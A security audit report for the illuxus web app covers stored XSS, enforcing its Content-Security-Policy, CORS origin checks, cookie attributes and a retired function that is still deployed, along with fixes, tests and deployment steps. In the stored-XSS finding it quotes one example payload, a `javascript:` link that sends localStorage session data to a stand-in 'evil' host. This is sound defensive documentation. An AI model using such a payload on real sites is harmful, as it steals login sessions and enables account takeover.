# Browser & Network Security Audit — illuxus

| | |
|---|---|
| **Date** | 3 November 2026 |
| **Scope** | illuxus.com web app (`src/`), Vercel config and routes (`vercel.json`, `api/`), Supabase edge functions (`supabase/functions/`), the public embed widget (`public/embed.js`) |
| **Checklist** | C. Browser and network security (C1–C7) |
| **Method** | Code review of every URL, HTML and script sink; live checks against illuxus.com (headers, redirects, deployed functions); a production build tested in Chrome with the new headers enforced (`scripts/csp-smoke.mjs`); database changes tested on Postgres (PGlite) |

## Summary

| Severity | Found | Fixed in code | Needs a manual step | Remaining (accepted / follow-up, listed below) |
|---|---|---|---|---|
| Critical | 1 | 1 | — | — |
| High | 3 | 2 | 1 | 1 (the manual step) |
| Medium | 4 | 4 | — | 3 residual risks |
| Low | 4 | 4 | — | 6 residual risks |

None of the fixes is live until they're deployed: see [Deployment steps](#deployment-steps).

### Checklist status

| # | Item | Before | After |
|---|---|---|---|
| C1 | Enforce HTTPS | ✅ Done | ✅ Done (+ `upgrade-insecure-requests`) |
| C2 | Security headers | ⚠️ CSP report-only, no COOP | ✅ CSP enforced, COOP added |
| C3 | Secure cookie attributes | ⚠️ Sidebar cookie without `Secure`/`SameSite` | ✅ Fixed |
| C4 | CSRF protection | ✅ Not needed (header tokens, no auth cookies) | ✅ Unchanged |
| C5 | XSS and CSP | ❌ Stored XSS via links; CSP not enforced | ✅ Fixed (three layers: display, database, CSP) |
| C6 | Cross-origin requests | ⚠️ Any `*.vercel.app` trusted; `ACAO: *` on pages | ✅ Fixed |
| C7 | Unnecessary endpoints / debug routes | ❌ Retired function still deployed | ⚠️ **Delete it in the Supabase dashboard** (manual) |

---

## Issues fixed

### CRITICAL-1 — Stored XSS through links people can save (C5)

**Problem.** URLs typed by users were rendered straight into `href` / `<iframe src>`. React 18.3.1 renders `javascript:` URLs as-is (it only warns in development), so a link like `javascript:fetch('//evil?'+localStorage…)` ran on illuxus.com when clicked. Login sessions live in `localStorage`, so it could take over the account.

| Who sets the URL | Who is attacked | Where |
|---|---|---|
| Any community member | Other members | Post link (`PostCard`), resource file URL (`CommunityResourcesPage`) |
| Any organiser | Every visitor of their public event / org page | 11 links + map and live-stream `<iframe>`s (`PublicEventRenderer`), accent link (`PublicOrgPage`) |
| Applicants, participants | Organisers, sponsors | Application answers (`ApplicationsSection`), shared participant data (`SharedDataTable`) |
| Vendors, sponsors, speakers | Organisers | Venue website / map / media, sponsor website, speaker LinkedIn / website |
| Site editor content | Everyone | Hero / CTA / pricing / header / footer links |

**Fix (three independent layers).**
1. **Display.** New `src/lib/safe-url.ts`: `safeUrl()` allows only `http(s)`, `mailto:`, `tel:`, same-site paths and `#anchors`; `safeEmbedUrl()` allows only `https`. It handles evasion tricks (case, tabs and control characters inside the scheme, `//host`, `data:`, `vbscript:`). Applied to the 41 data-driven links and both iframes.
2. **Database.** `supabase/RUN_ME_security_fixes_D.sql` (bundle section 082): community post links must be `http(s)` and resource file URLs `https`; existing bad post links are cleared.
3. **Browser.** The enforced CSP (HIGH-1) has no `'unsafe-inline'`, so browsers refuse to run *any* `javascript:` URL, including ones in places not listed here.

**Verified.** `safe-url.test.ts` (4 tests). The database rule was tested on Postgres (8 checks: existing link cleared, `javascript:` / `data:` / mixed case refused, `https` accepted, re-runnable). In Chrome, a planted `javascript:` link did not run on any of 9 pages.

### HIGH-1 — Content-Security-Policy was not enforced (C2, C5)

**Problem.** The policy was sent as `Content-Security-Policy-Report-Only` with no report address, so it blocked nothing and reported nothing. It also allowed `'unsafe-inline'` scripts.

**Fix.**
- `vercel.json`: enforced `Content-Security-Policy`.
  - `script-src` allows only the site's own files, GA4 and Clarity, plus SHA-256 hashes of the two inline boot scripts (theme, splash) and the two inline `onload` handlers (font and app-stylesheet loaders, via `'unsafe-hashes'`).
  - It adds `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`, `frame-ancestors 'none'` and `upgrade-insecure-requests`.
  - `frame-src` now allows Vimeo, Twitch and Google Maps. Organisers can embed those, and the old policy would have blocked them.
- Analytics (`src/components/SiteHead.tsx`): GA4 and Clarity no longer inject inline `<script>` code. Their setup runs in the app and only their tag files are loaded.
- Reporting: `report-uri /api/csp-report` plus `Reporting-Endpoints`. New `api/csp-report.ts` logs one capped line per violation to the Vercel function logs. It stores nothing and drops query strings.
- Guard rail: `src/lib/__tests__/csp-hashes.test.ts` fails if an inline script or handler changes without its hash being updated. Otherwise browsers would silently block it, and the theme, splash or stylesheet would break.

**Verified.** `scripts/csp-smoke.mjs` ran Chrome against a production build with the `vercel.json` headers and live Supabase data. On `/`, `/events`, `/login`, `/about`, `/pricing`, `/features`, `/contact`, a public event page and `/discover`: 0 violations; the theme script ran, the splash dismissed, the app stylesheet applied, and `javascript:` links were blocked.

### HIGH-2 — Any `*.vercel.app` site was a trusted origin (C6)

**Problem.** The shared CORS module and 8 functions with inline copies allowed every `https://*.vercel.app` origin *with credentials*. Anyone can deploy to `vercel.app`.

**Fix.** All 9 copies now call `previewOriginAllowed(origin)`. It trusts preview deployments only when they match the new `PREVIEW_ORIGIN_PATTERN` secret, e.g. `https://illuxus-[a-z0-9-]+-yourteam\.vercel\.app`. The pattern is anchored, and an invalid one fails closed. With the secret unset, no `vercel.app` origin is trusted. Production domains (`PUBLIC_DOMAIN`, `ALLOWED_ORIGINS`) work as before.

Files: `_shared/cors.ts`, `generate-creative-background`, `generate-creative-copy`, `guest-registration`, `notify-organizer-venue-response`, `notify-venue-selection`, `send-ticket-reply`, `submit-support-ticket`, `team-invitation`.

**Verified.** `edge-cors-origins.test.ts` (4 tests): `attacker.vercel.app` refused; own domain allowed; preview pattern match and suffix-attack refusal; invalid pattern ignored.

### HIGH-3 — Retired `create-participant-account` function still deployed (C7) — **manual step**

**Problem.** Security review F-04 removed this function from the code (organiser-controlled account creation, an account-takeover risk), but it is still deployed: it answered an `OPTIONS` probe with HTTP 200.

**Fix.** Can't be done from the repository. **Supabase dashboard → Edge Functions → `create-participant-account` → Delete.** Afterwards, `OPTIONS https://<project>.supabase.co/functions/v1/create-participant-account` should return 404.

### MEDIUM-1 — No `Cross-Origin-Opener-Policy` (C2)

**Fix.** `vercel.json`: `Cross-Origin-Opener-Policy: same-origin-allow-popups`. It isolates illuxus.com from windows it opens or is opened by, while keeping popups (e.g. a payment or login window) working.

### MEDIUM-2 — Server-rendered JSON-LD could be broken out of (C5)

**Problem.** `api/event-og.ts` and `api/org-og.ts` put organiser-written text into a `<script type="application/ld+json">` block and escaped only `</script`. The `<!--<script>` parser trick was not covered.

**Fix.** Every `<` is written as `<`. It's still the same JSON for search engines, but nothing can close or re-open the script element. Verified: a hostile payload round-trips to the same value with no `<` in the output.

### MEDIUM-3 — Analytics injected inline scripts (C5)

Part of HIGH-1: GA4 and Clarity ran from injected inline `<script>` text, which an enforced CSP has to forbid. They now set up in the app and load only their tag files. Behaviour is unchanged.

### MEDIUM-4 — CSP violations went nowhere (C2)

Part of HIGH-1: the new `/api/csp-report` endpoint and reporting headers. Check the Vercel function logs for `fn: "csp-report"`.

### LOW-1 — Every page sent `Access-Control-Allow-Origin: *` (C6)

Vercel's default for static files. `vercel.json` now sends `Access-Control-Allow-Origin: https://illuxus.com` for pages and assets. `embed.js` (third-party sites load it) and `/api/*` keep their own CORS headers.

### LOW-2 — Sidebar cookie without `Secure` / `SameSite` (C3)

`src/components/ui/sidebar.tsx`: the sidebar state cookie is now `SameSite=Lax`, plus `Secure` on https (`localhost` is http). It is the only cookie the app sets itself, and it only stores whether the sidebar is open.

### LOW-3 — Vimeo / Twitch / Google Maps embeds would be blocked by the CSP

Found while building HIGH-1. Organisers can embed these, but the old `frame-src` only listed YouTube and google.com. All are now allowed.

### LOW-4 — CSP `script-src` listed an unused host

`https://va.vercel-scripts.com` (Vercel Analytics) is not used anywhere, so it was removed from the allowed script sources.

---

## Remaining issues

These are not fixed in code. Each has a reason and a suggested next step.

### High

| # | Issue | Why it remains | Next step |
|---|---|---|---|
| H-R1 | `create-participant-account` still deployed | Needs the Supabase dashboard (HIGH-3) | Delete it; confirm 404 |

### Medium

| # | Issue | Why it remains | Next step |
|---|---|---|---|
| M-R1 | Login sessions stored in `localStorage` | Supabase's browser default. Moving to `httpOnly` cookies needs a server-side auth flow (e.g. Supabase SSR on Vercel functions). The enforced CSP and `safeUrl` now block the ways script could be injected to read it | Consider cookie-based sessions if the app gains server rendering |
| M-R2 | `style-src` still allows `'unsafe-inline'` | React components use inline `style=` attributes throughout. Style injection can't run script, so impact is limited (CSS-based data leaks) | Leave unless styles move to classes |
| M-R3 | `connect-src` allows any `https:` / `wss:` host | Organiser logos, brand kits and fonts are fetched from many hosts; webinar SDKs (LiveKit, Agora) use many endpoints. Script injection is what this would protect against, and that's now blocked by `script-src` | After a few weeks of `/api/csp-report` logs, narrow to the hosts actually used |

### Low

| # | Issue | Why it remains | Next step |
|---|---|---|---|
| L-R1 | `'unsafe-hashes'` for two inline `onload` handlers | Needed by the non-blocking font and stylesheet loaders (performance work). Only those two exact handlers are allowed | Could move them into the hashed boot script |
| L-R2 | GA4 and Clarity scripts are trusted third parties | Vendor tags can't use Subresource Integrity (they change without notice). Loaded only after analytics consent | Accept, or drop a vendor if not needed |
| L-R3 | Public storage buckets (`community`, `site-assets`) serve user-uploaded files from the Supabase domain | Resources and brand kits legitimately accept PDFs and design files, so there is no type allow-list. The files are on `*.supabase.co`, not illuxus.com, so they can't reach illuxus sessions | Consider forcing `Content-Disposition: attachment` for non-image files |
| L-R4 | HSTS `preload` is set but submission isn't confirmed | Outside the repo | Check / submit illuxus.com at hstspreload.org |
| L-R5 | `/api/csp-report` is unauthenticated | Browsers send reports without credentials by design. Body capped at 16 KB, 10 reports per request, fields truncated, nothing stored | Accept |
| L-R6 | `fx-rates` edge function isn't deployed (404) | Not a security issue: its wildcard CORS is fine for public exchange rates. Any screen that calls it will fail | Deploy it or remove its callers |

### Checked and fine

- **HTTPS:** `http://` redirects with 308; HSTS is 2 years with `includeSubDomains; preload`.
- **Headers:** `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`.
- **CSRF:** not applicable. API calls authenticate with a bearer token in the `Authorization` header, never with cookies, so another site can't make authenticated requests on a user's behalf.
- **Rich text:** event descriptions and custom HTML blocks go through DOMPurify with a strict allow-list. Markdown is escaped first. Printed badges escape names.
- **Embed widget** (`public/embed.js`): renders on third-party sites, escapes every value (`h()`), builds links from fixed paths, and uses no iframe.
- **Login redirects:** `next=` targets go through `safeInternalPath()` (internal paths only, with tests).
- **Debug routes:** `/__preview/*` exist only in development builds. Source maps return 403.
- **Webhooks:** LiveKit and WhatsApp verify signatures.

---

## Deployment steps

Run them in this order:

1. **Supabase SQL Editor:** run `supabase/RUN_ME_security_fixes_D.sql`. Run B and C first if they aren't applied yet.
2. **Supabase secrets:** if you use Vercel preview deployments, set `PREVIEW_ORIGIN_PATTERN` to a regex for *your* preview hosts. Leave it unset otherwise.
3. **Supabase Edge Functions:** redeploy the functions whose CORS changed. In the dashboard, paste `dashboard-inline.ts` where one exists, otherwise `index.ts`. Regenerate the copies first with `npm run functions:inline`.

   | Function | File to paste |
   |---|---|
   | `notify-organizer-venue-response`, `notify-venue-selection`, `team-invitation` | `dashboard-inline.ts` |
   | `generate-creative-background`, `generate-creative-copy`, `guest-registration`, `send-ticket-reply`, `submit-support-ticket` | `index.ts` (self-contained) |

4. **Supabase dashboard:** delete `create-participant-account` (HIGH-3).
5. **Vercel:** deploy the frontend. It carries the CSP, COOP, CORS headers, `/api/csp-report`, `safeUrl`, the analytics change and the JSON-LD escaping.
6. **After deploy:**
   - `curl -sI https://illuxus.com/ | grep -i content-security-policy` shows the enforced header, not `-Report-Only`.
   - Run `node scripts/csp-smoke.mjs https://illuxus.com`.
   - Watch the Vercel logs for `csp-report` lines for a few days, especially on webinar, live-stream and analytics pages, which the smoke test can't reach without a login.

## Maintaining this

- **Editing an inline script** in `index.html`, or the stylesheet loader in `vite.config.ts`: update its `sha256-…` hash in `vercel.json`. `csp-hashes.test.ts` fails and tells you which one.
- **Adding a third-party script, frame or embed provider:** add its host to the matching CSP directive in `vercel.json`, then run `scripts/csp-smoke.mjs`.
- **Rendering a URL that comes from data:** wrap it in `safeUrl()` (links) or `safeEmbedUrl()` (iframes).
- **New edge function with its own CORS:** use `previewOriginAllowed()`, never a `*.vercel.app` wildcard.

## Files changed in this round

- **Frontend:** `src/lib/safe-url.ts` (new); 22 components and pages wrapped in `safeUrl` / `safeEmbedUrl`; `src/components/SiteHead.tsx`; `src/components/ui/sidebar.tsx`.
- **Vercel:** `vercel.json`; `api/csp-report.ts` (new); `api/event-og.ts`; `api/org-og.ts`.
- **Edge functions:** `supabase/functions/_shared/cors.ts` plus 8 functions; regenerated `dashboard-inline.ts` copies.
- **Database:** `supabase/RUN_ME_security_fixes_D.sql` (new; schema bundle section 082; README row).
- **Tests and tools:** `safe-url.test.ts`, `csp-hashes.test.ts`, `edge-cors-origins.test.ts` (new); `scripts/csp-smoke.mjs` (new).

Test status at the end of this round: 146 test files / 1,531 tests passing; production build passing; no new type or lint errors; database script tested on Postgres (8/8).
